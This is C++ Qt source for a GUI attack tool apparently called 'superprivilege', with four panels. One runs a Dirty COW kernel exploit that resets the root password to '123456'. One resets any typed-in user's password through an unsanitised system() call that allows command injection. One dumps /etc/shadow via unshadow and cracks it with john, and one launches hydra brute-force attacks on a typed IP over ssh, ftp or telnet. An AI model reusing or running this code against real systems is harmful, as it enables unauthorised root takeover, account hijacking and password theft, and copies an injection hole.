#include "superprivilege.h"
#include "c37292.h"
#include "dirtycow/dcow.h"

extern QString getcurrenttime();
int printlog;
#define ONLINE 0
#define OFFLINE 1

superprivilege::superprivilege(QWidget *parent) : QWidget(parent)
{
    // 初始化左侧功能列表
    initItemList();

    // 初始化页面
    initWidgetVertical();
    // 初始化页面
    initWidgetHorizontal();
    // 初始化页面
    initWidgetOffline();
    // 初始化页面
    initWidgetOnline();

    // 将功能页面存放到堆栈里
    m_stackWidget = new QStackedWidget();
    m_stackWidget->addWidget(m_widgetVertical);
    m_stackWidget->addWidget(m_widgetHorizontal);
    m_stackWidget->addWidget(m_widgetOffline);
    m_stackWidget->addWidget(m_widgetOnline);

    // 设置本页的主界面排版
    QHBoxLayout *main_layout = new QHBoxLayout();
    main_layout->addWidget(m_itemList);
    main_layout->addWidget(m_stackWidget);
    main_layout->setStretchFactor(m_itemList, 4);
    main_layout->setStretchFactor(m_stackWidget, 4);
    main_layout->setContentsMargins(0,0,0,0);
    setLayout(main_layout);

    connect(m_buttonVertical, SIGNAL(clicked()), this, SLOT(verticalPrivilege()));
    connect(m_buttonShowUser, SIGNAL(clicked()), this, SLOT(showAllUser()));
    connect(m_buttonHorizontal, SIGNAL(clicked()), this, SLOT(horizontalPrivilege()));
    connect(m_buttonOnlineAttack, SIGNAL(clicked()), this, SLOT(onlineAttack()));
    connect(m_buttonOfflineAttack, SIGNAL(clicked()), this, SLOT(offlineAttack()));
    connect(m_itemList, SIGNAL(currentRowChanged(int)), m_stackWidget, SLOT(setCurrentIndex(int)));

    // 处理执行脚本线程的信号
    connect(&m_cmdThread, &ExecScriptsSlaveThread::scriptResult, this, &superprivilege::processScriptResult);

    // 启动线程
    m_cmdThread.startSlave();

    this->setAutoFillBackground(true);
}


void superprivilege::processScriptResult(const QString & result) {
    // 对脚本执行结果用换行符分割

    switch(printlog)
    {
    case ONLINE:
        appendOutputOn(result);
        break;
    case OFFLINE:
        appendOutputOff(result);
        break;
    }

//    QStringList resultList = result.split("\n");
//    int modelRowCount = m_model->rowCount();

//    float maxRate = 0;
//    QString record;
//    QStringList rowData;
//    for (int i=0; i < modelRowCount; i++) {
//        rowData.clear();
//        if (i < resultList.count()) {
//            // 按顺序取记录
//            record = resultList[i];

//            // 使用正则表达式提取数据
//            QRegExp regExp("PID:(.*)RATE:(.*)NAME:(.*)END");
//            int pos = record.indexOf(regExp);
//            if (pos < 0)
//                continue;

//            if (maxRate < regExp.cap(2).toFloat())
//                maxRate = regExp.cap(2).toFloat();

//            // 设置表格的行数据
//            rowData<<regExp.cap(1)<<regExp.cap(3)<<regExp.cap(2);

//        } else {
//            // 取到的数据不够model的行数时，采用空行
//            rowData<<""<<""<<"";
//        }
//        m_model->setRowData(i, rowData);

//    }

//    // 调整横坐标的尺度，使得图形更协调
//    m_axisX->setRange(0, maxRate * 8 / 7);

//    // 更新图表
//    m_model->refresh();

}
void superprivilege::initItemList(){
    m_itemList = new QListWidget();

    // listwidget按钮设置
    QListWidgetItem *Item_0 = new QListWidgetItem(tr("纵向提权"));//利用系统漏洞
    Item_0->setIcon(QIcon(":/page_three/vertical"));
    Item_0->setTextAlignment(Qt::AlignLeft);
    Item_0->setFlags(Qt::ItemIsSelectable | Qt::ItemIsEnabled);
    QListWidgetItem *Item_1 = new QListWidgetItem(tr("横向提权"));
    Item_1->setIcon(QIcon(":/page_three/horizon"));
    Item_1->setTextAlignment(Qt::AlignLeft);
    Item_1->setFlags(Qt::ItemIsSelectable | Qt::ItemIsEnabled);
    QListWidgetItem *Item_2 = new QListWidgetItem(tr("离线密码破解"));
    Item_2->setIcon(QIcon(":/page_three/offline"));
    Item_2->setTextAlignment(Qt::AlignLeft);
    Item_2->setFlags(Qt::ItemIsSelectable | Qt::ItemIsEnabled);
    QListWidgetItem *Item_3 = new QListWidgetItem(tr("在线密码攻击"));
    Item_3->setIcon(QIcon(":/page_three/online"));
    Item_3->setTextAlignment(Qt::AlignLeft);
    Item_3->setFlags(Qt::ItemIsSelectable | Qt::ItemIsEnabled);

    m_itemList->insertItem(0,Item_0);
    m_itemList->insertItem(1,Item_1);
    m_itemList->insertItem(2,Item_2);
    m_itemList->insertItem(3,Item_3);
    // 标签字体大小
    QFont font;
    font.setPointSize(14);
    font.setUnderline(0);
    m_itemList->setFont(font);

}

void superprivilege::initWidgetVertical()
{
    m_widgetVertical = new QWidget();
    m_textResultVertical = new QTextEdit();
    m_textResultVertical->setFixedSize(680,320);
    m_textResultVertical->setReadOnly(true);

    // 设置
    QFont fontButton;
    fontButton.setPointSize(13);
    m_buttonVertical= new QPushButton();
    m_buttonVertical->setText(tr("纵向提权"));
    m_buttonVertical->setFont(fontButton);
    QPixmap pixmap(":/page_three/hacker");
    m_buttonVertical->setIcon(pixmap);
    m_buttonVertical->setStyleSheet(
                                    "QPushButton:hover{background-color:white; color: outset;}"   //鼠标停放时的色彩
                                    "QPushButton:pressed{background-color:rgb(85, 170, 255);border-style: inset; }"    //鼠标按下的色彩
                                   );
    m_buttonVertical->setIconSize(pixmap.size());
    m_buttonVertical->setFixedSize(180, 70);
    m_buttonVertical->setObjectName("greenButton");

    // 水平布局-1
    QHBoxLayout *widget_1_H_layout = new QHBoxLayout();
    widget_1_H_layout->addWidget(m_buttonVertical,0,Qt::AlignCenter);//, 70, Qt::AlignRight);
    widget_1_H_layout->setContentsMargins(20, 5, 20, 5);

    // 垂直布局
    QVBoxLayout *widget_1_V_layout = new QVBoxLayout();
    widget_1_V_layout->addLayout(widget_1_H_layout);
    widget_1_V_layout->addWidget(m_textResultVertical);//, 0, Qt::AlignTop);
//    widget_1_V_layout->setContentsMargins(20, 5, 20, 5);
//    widget_1_V_layout->addStretch();
    QHBoxLayout *main_layout = new QHBoxLayout();
    main_layout->addLayout(widget_1_V_layout);
//    main_layout->setContentsMargins(0, 0, 0, 0);

    m_widgetVertical->setLayout(main_layout);
}

void superprivilege::initWidgetHorizontal()
{
    m_widgetHorizontal= new QWidget();
    m_textResultHorizon = new QTextEdit();
    m_textResultHorizon->setFixedSize(680,320);
    m_textResultHorizon->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOn);
    m_textResultHorizon->setVerticalScrollBarPolicy(Qt::ScrollBarAlwaysOn);
    m_textResultHorizon->setReadOnly(true);

    // 设置
    QFont fontButton;
    fontButton.setPointSize(13);

    m_buttonShowUser= new QPushButton();
    m_buttonShowUser->setText(tr("列举显示所有用户"));
    m_buttonShowUser->setFont(fontButton);
//    QPixmap pixmapuser(":/page_three/user");
//    m_buttonShowUser->setIcon(pixmapuser);
//    m_buttonShowUser->setStyleSheet(
//                                    "QPushButton:hover{background-color:white; color: outset;}"   //鼠标停放时的色彩
//                                    "QPushButton:pressed{background-color:rgb(85, 170, 255);border-style: inset; }"    //鼠标按下的色彩
//                                   );
//    m_buttonShowUser->setIconSize(pixmapuser.size());
//    m_buttonShowUser->setFixedSize(180, 70);
//    m_buttonShowUser->setObjectName("greenButton");

    m_inputuser = new QLineEdit();
//    m_inputuser->setText("root");
    m_inputuser->setFixedSize(100, 24);

    m_buttonHorizontal= new QPushButton();
    m_buttonHorizontal->setText(tr("横向提权"));
    m_buttonHorizontal->setFont(fontButton);
    QPixmap pixmap(":/page_three/hacker");
    m_buttonHorizontal->setIcon(pixmap);
    m_buttonHorizontal->setStyleSheet(
                                    "QPushButton:hover{background-color:white; color: outset;}"   //鼠标停放时的色彩
                                    "QPushButton:pressed{background-color:rgb(85, 170, 255);border-style: inset; }"    //鼠标按下的色彩
                                   );
    m_buttonHorizontal->setIconSize(pixmap.size());
    m_buttonHorizontal->setFixedSize(180, 70);
    m_buttonHorizontal->setObjectName("greenButton");

    // 水平布局-1
    QHBoxLayout *widget_1_H_layout = new QHBoxLayout();
//    widget_1_H_layout->addWidget(m_buttonVertical,0,Qt::AlignLeft);//, 70, Qt::AlignRight);
    widget_1_H_layout->addWidget(m_buttonShowUser);//, 70, Qt::AlignRight);
    widget_1_H_layout->setContentsMargins(20, 5, 20, 5);

    // 水平布局-2
    QHBoxLayout *widget_2_H_layout = new QHBoxLayout();
    QLabel * labeluser = new QLabel();
    labeluser->setText("请输入提权的用户：");
    widget_2_H_layout->addWidget(labeluser,0,Qt::AlignLeft);//, 0, Qt::AlignLeft);

    widget_2_H_layout->addWidget(m_inputuser,0,Qt::AlignLeft);//, 0, Qt::AlignLeft);
    widget_2_H_layout->addWidget(m_buttonHorizontal,0,Qt::AlignLeft);//, 70, Qt::AlignRight);
    widget_2_H_layout->setContentsMargins(20, 5, 20, 5);

    // 垂直布局
    QVBoxLayout *widget_1_V_layout = new QVBoxLayout();
    widget_1_V_layout->addLayout(widget_1_H_layout);
    widget_1_V_layout->addLayout(widget_2_H_layout);
    widget_1_V_layout->addWidget(m_textResultHorizon);//, 0, Qt::AlignTop);
//    widget_1_V_layout->setContentsMargins(20, 5, 20, 5);
//    widget_1_V_layout->addStretch();
    QHBoxLayout *main_layout = new QHBoxLayout();
    main_layout->addLayout(widget_1_V_layout);
//    main_layout->setContentsMargins(0, 0, 0, 0);

    m_widgetHorizontal->setLayout(main_layout);
}

void superprivilege::initWidgetOffline()
{
    m_widgetOffline = new QWidget();
    m_textResultOffline = new QTextEdit();
    m_textResultOffline->setFixedSize(680,320);
    m_textResultOffline->setReadOnly(true);

    // 设置
    QFont fontButton;
    fontButton.setPointSize(13);

    m_buttonOfflineAttack= new QPushButton();
    m_buttonOfflineAttack->setText(tr("离线密码破解"));
    m_buttonOfflineAttack->setFont(fontButton);
    QPixmap pixmap(":/page_three/hacker");
    m_buttonOfflineAttack->setIcon(pixmap);
    m_buttonOfflineAttack->setStyleSheet(
                                    "QPushButton:hover{background-color:white; color: outset;}"   //鼠标停放时的色彩
                                    "QPushButton:pressed{background-color:rgb(85, 170, 255);border-style: inset; }"    //鼠标按下的色彩
                                   );
    m_buttonOfflineAttack->setIconSize(pixmap.size());
    m_buttonOfflineAttack->setFixedSize(180, 70);
    m_buttonOfflineAttack->setObjectName("greenButton");

//    m_buttonOnlineAttack= new QPushButton();
//    m_buttonOnlineAttack->setText(tr("在线密码攻击"));
//    m_buttonOnlineAttack->setFont(fontButton);

    // 水平布局-1
    QHBoxLayout *widget_1_H_layout = new QHBoxLayout();
    widget_1_H_layout->addWidget(m_buttonOfflineAttack,0,Qt::AlignCenter);//, 70, Qt::AlignRight);
    widget_1_H_layout->setContentsMargins(20, 5, 20, 5);

//    // 水平布局-2
//    QHBoxLayout *widget_2_H_layout = new QHBoxLayout();
//    widget_2_H_layout->addWidget(m_buttonOfflineAttack);//, 0, Qt::AlignLeft);
//    widget_2_H_layout->addWidget(m_buttonOnlineAttack);//, 0, Qt::AlignLeft);
//    widget_2_H_layout->setContentsMargins(20, 5, 20, 5);

    // 垂直布局
    QVBoxLayout *widget_1_V_layout = new QVBoxLayout();
    widget_1_V_layout->addLayout(widget_1_H_layout);
//    widget_1_V_layout->addLayout(widget_2_H_layout);
    widget_1_V_layout->addWidget(m_textResultOffline);//, 0, Qt::AlignTop);
//    widget_1_V_layout->setContentsMargins(20, 5, 20, 5);
//    widget_1_V_layout->addStretch();
    QHBoxLayout *main_layout = new QHBoxLayout();
    main_layout->addLayout(widget_1_V_layout);
//    main_layout->setContentsMargins(0, 0, 0, 0);

    m_widgetOffline->setLayout(main_layout);
}

void superprivilege::initWidgetOnline()
{
    m_widgetOnline = new QWidget();
    m_textResultOnline = new QTextEdit();
    m_textResultOnline->setFixedSize(680,320);
    m_textResultOnline->setReadOnly(true);

    // 设置
    QFont fontButton;
    fontButton.setPointSize(13);
//    m_buttonVertical= new QPushButton();
//    m_buttonVertical->setText(tr("纵向提权"));
//    m_buttonVertical->setFont(fontButton);

//    m_buttonHorizontal= new QPushButton();
//    m_buttonHorizontal->setText(tr("横向提权"));
//    m_buttonHorizontal->setFont(fontButton);

//    m_buttonOfflineAttack= new QPushButton();
//    m_buttonOfflineAttack->setText(tr("离线密码破解"));
//    m_buttonOfflineAttack->setFont(fontButton);

    m_buttonOnlineAttack= new QPushButton();
    m_buttonOnlineAttack->setText(tr("在线密码攻击"));
    m_buttonOnlineAttack->setFont(fontButton);
    QPixmap pixmap(":/page_three/hacker");
    m_buttonOnlineAttack->setIcon(pixmap);
    m_buttonOnlineAttack->setStyleSheet(
                                    "QPushButton:hover{background-color:white; color: outset;}"   //鼠标停放时的色彩
                                    "QPushButton:pressed{background-color:rgb(85, 170, 255);border-style: inset; }"    //鼠标按下的色彩
                                   );
    m_buttonOnlineAttack->setIconSize(pixmap.size());
    m_buttonOnlineAttack->setFixedSize(180, 70);
    m_buttonOnlineAttack->setObjectName("greenButton");

    QLabel * labelip = new QLabel();
    labelip->setText("请输入在线攻击地址:");

    QLabel * labelmode = new QLabel();
    labelmode->setText("攻击方式:");

    m_ip = new QLineEdit();
    m_ip->setText("172.28.128.3");
    m_ip->setFixedSize(150, 24);

    m_comboBox =new QComboBox();
    QStringList strList;
    strList<<"ssh"<<"ftp"<<"telnet";
    m_comboBox->addItems(strList);

    // 水平布局-1
    QHBoxLayout *widget_1_H_layout = new QHBoxLayout();

    widget_1_H_layout->addWidget(labelip,0,Qt::AlignLeft);
    widget_1_H_layout->addWidget(m_ip,0,Qt::AlignLeft);
    widget_1_H_layout->addWidget(labelmode,0,Qt::AlignLeft);
    widget_1_H_layout->addWidget(m_comboBox,0,Qt::AlignLeft);
    widget_1_H_layout->addWidget(m_buttonOnlineAttack,0,Qt::AlignCenter);//, 70, Qt::AlignRight);
    widget_1_H_layout->setContentsMargins(20, 5, 20, 5);

//    // 水平布局-2
//    QHBoxLayout *widget_2_H_layout = new QHBoxLayout();
//    widget_2_H_layout->addWidget(m_buttonOfflineAttack);//, 0, Qt::AlignLeft);
//    widget_2_H_layout->addWidget(m_buttonOnlineAttack);//, 0, Qt::AlignLeft);
//    widget_2_H_layout->setContentsMargins(20, 5, 20, 5);

    // 垂直布局
    QVBoxLayout *widget_1_V_layout = new QVBoxLayout();
    widget_1_V_layout->addLayout(widget_1_H_layout);
    widget_1_V_layout->addWidget(m_textResultOnline);//, 0, Qt::AlignTop);
//    widget_1_V_layout->setContentsMargins(20, 5, 20, 5);
//    widget_1_V_layout->addStretch();
    QHBoxLayout *main_layout = new QHBoxLayout();
    main_layout->addLayout(widget_1_V_layout);
//    main_layout->setContentsMargins(0, 0, 0, 0);

    m_widgetOnline->setLayout(main_layout);
}

void superprivilege::appendOutputV(QString output) {
    output = "["+getcurrenttime()+"] "+output+"\n";

    QString strOldRecord = m_textResultVertical->toPlainText().left(1024);
    m_textResultVertical->setPlainText(strOldRecord + output);
    m_textResultVertical->moveCursor(QTextCursor::End);


}
void superprivilege::appendOutputH(QString output) {
    output = "["+getcurrenttime()+"] "+output+"\n";
    QString strOldRecord = m_textResultHorizon->toPlainText().left(1024);
    m_textResultHorizon->setPlainText(strOldRecord+output);
    m_textResultHorizon->moveCursor(QTextCursor::End);

}
void superprivilege::appendOutputOff(QString output) {
    output = "["+getcurrenttime()+"] "+output+"\n";
    QString strOldRecord = m_textResultOffline->toPlainText().left(1024000);
    m_textResultOffline->setPlainText(strOldRecord+ output);
    m_textResultOffline->moveCursor(QTextCursor::End);

}
void superprivilege::appendOutputOn(QString output) {
    output = "["+getcurrenttime()+"] "+output+"\n";
    QString strOldRecord = m_textResultOnline->toPlainText().left(1024);
    m_textResultOnline->setPlainText(strOldRecord+ output);
    m_textResultOnline->moveCursor(QTextCursor::End);

}

void superprivilege::verticalPrivilege()
{
    powerAuthority();
}

void superprivilege::showAllUser()
{
    appendOutputH("查看显示所有用户");
//    QString cmd = "cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F":" '{ print $1 }'|more ";
//    QString cmd = "cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F\":\" '{ print $1 }'|more ";
//    QString cmd = "cat /etc/passwd |cut -f 1 -d :";

    QString cmd = "cut -d: -f1 /etc/passwd";
//    QString cmd = "cat /etc/passwd|grep -v /sbin/login |cut -f1 -d:";

    QString result = CSysUtils::execCmd(cmd);
    appendOutputH(result);


}

void superprivilege::horizontalPrivilege()
{
//    QString cmd = "echo ";
//    cmd+=m_inputuser->text();
//    cmd+=+":";
//    cmd+="123456";
//    cmd+=" | chpasswd";
//    QString result = CSysUtils::execCmd(cmd);
//    appendOutputH(result);
//    appendOutputH("横向提权成功，已经将用户："+m_inputuser->text()+" 密码篡改为：123456");

    QString cmd = "echo ";
    cmd+=m_inputuser->text();
    cmd+=+":";
    cmd+="123456";
    cmd+=" | chpasswd";
    QByteArray ba = cmd.toLatin1(); // must

//    FILE *pf;
//    char buffer[4096];
//    pf = popen(ba.data(), "r");
//    fread(buffer, sizeof(buffer), 1, pf);
//    printf("%s\n", buffer);
//    appendOutput(buffer);
//    pclose(pf);

//    appendOutputH(runcmd(cmd));

    int iret = system(ba.data());
    QString msg="";
    if(iret==0)
    {
        msg = "横向提权，已经将用户：:"+m_inputuser->text()+" 密码篡改为：123456";
    }
    else
    {
        msg = "横向提权，用户:"+m_inputuser->text()+"密码篡改 ERROR.";
    }

    appendOutputH(msg);


}

int superprivilege::powerAuthority()
{

//    appendOutputV("纵向提权成功，已经获取root权限.");
//    return 0;
/*
// *** for test bash
//    runcmd("./1.sh");
//    return 0;
// *** for test bash end
/**/
    //在目標機上測試執行
//    c37292 *p37292 = new c37292();
//    return p37292->attack();

/*
// *** for test bash
    system("./37292");//OK
//    system("su");
//    system("");
    runcmd("su -");
    return 0;
/**/

/*
    QProcess p(0);
    p.start("./37292");

    p.waitForStarted();

//    QString str="ls -l";
//    const char *cstr= str.toLocal8Bit().constData();
//    p.write(cstr);
//    p.write("\n\r");

//    p.waitForFinished();
    sleep(2);

    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());

    QString str="ls -l";
    const char *cstr= str.toLocal8Bit().constData();
    p.write(cstr);
    p.write("\n\r");

    appendOutputV(strTemp);
/**/
//    appendOutputV(runcmd("su -"));

//    system("./dcow -s");
//    appendOutputV(runcmd("dcow -s"));

/*************************/
    //test 0k
    Dcow dcow(true, true);
    dcow.expl();
/*************************/
//    appendOutputV(runcmd("whoami"));
    appendOutputV("提权完成，root密码已被篡改为\"123456\"");
    appendOutputV("请先关闭程序，以root用户权限运行该程序测试其他功能");

    return 0;

//    QProcess p(0);
//    QString cmd = "./37292";
//    p.start(cmd);
//    p.waitForStarted();
//    p.waitForFinished();
//    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
//    appendOutputOn(strTemp);

    /*
    FILE *pf;
    char buffer[4096];
    pf = popen("./37292", "r");
    fread(buffer, sizeof(buffer), 1, pf);
    printf("%s\n", buffer);
    appendOutputV(buffer);
    pclose(pf);

    QProcess *p = new QProcess();
////    QString cmd = "37292";
////    QString cmd = "./37292";
    QString cmd = "test37292";
//    p->start(cmd);
//    p->waitForStarted();
//    p->waitForFinished();
//    QString strTemp=QString::fromLocal8Bit(p->readAllStandardOutput());
//    appendOutputV(strTemp);

    cmd = "whoami";
    p->start(cmd);
    p->waitForStarted();
    p->waitForFinished();
QString    strTemp=QString::fromLocal8Bit(p->readAllStandardOutput());
    appendOutputV(strTemp);

/**/
}

void superprivilege::onlineAttack()
{
    appendOutputOn("开始在线密码破解...");
    appendOutputOn(runcmd("rm -rf save.log"));
    QString command = "hydra -L user.txt -P password.txt -t 6 -vV -e ns -o save.log "+m_ip->text() + " " + m_comboBox->currentText();

    QByteArray ba = command.toLatin1();

    QFile file("online.sh");
    file.open(QIODevice::WriteOnly | QIODevice::Text);
    file.write("rm -rf save.log\n");
    file.write(ba.data());
    file.write("\n cat save.log\n");
    file.close();


    QString script = g_sWorkingPath + "/online.sh";

    printlog=ONLINE;
    m_cmdThread.execScipts(script);

//    appendOutputOn(runcmd(command));
//    appendOutputOn(runcmd("cat save.log"));
//    appendOutputOn("Online attack has been done.\n");

}

void superprivilege::offlineAttack()
{
//    appendOutputOff("root:toor:0:0:root:/root:/bin/bash");
//    appendOutputOff("crt:crt123:0:1000::/home/crt:/bin/sh");
//    appendOutputOff("wyt:toor:1000:1000:,,,:/home/wyt:/bin/bash");
//    appendOutputOff("lvjz:1234:1001:1002::/home/lvjz:/bin/sh");


    appendOutputOff("开始离线密码破解...");
//    offlineAttackPython();
    offlineAttackJohn();
    return;

}

void superprivilege::offlineAttackPython()
{
    appendOutputOff(runcmd("python3 ./attackpassword.py"));
}

QString superprivilege::runcmd(QString command)
{
    QProcess p(0);
    p.start(command);
    p.waitForStarted();
    p.waitForFinished();
    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
    return strTemp;
}

void superprivilege::offlineAttackJohn()
{
/*
    QFile file("offline.sh");
    file.open(QIODevice::WriteOnly | QIODevice::Text);
//    file.write("rm -rf mypasswd\n");
//    file.write("umask 077\n");
    file.write("unshadow /etc/passwd /etc/shadow >mypasswd\n");
    file.write("john mypasswd\n");
    file.write("john --show mypasswd\n");
    file.close();


    QString script = g_sWorkingPath + "/offline.sh";

    printlog=OFFLINE;
    m_cmdThread.execScipts(script);
/**/


    appendOutputOff(runcmd("rm -rf mypasswd"));
    appendOutputOff(runcmd("umask 077"));
    QString strRecv=runcmd("unshadow /etc/passwd /etc/shadow");
    QFile file("mypasswd");
    file.open(QIODevice::WriteOnly | QIODevice::Text);
    file.write(strRecv.toUtf8());
    file.close();

    appendOutputOff(runcmd("john mypasswd"));
    appendOutputOff(runcmd("john --show mypasswd"));
/**/
}
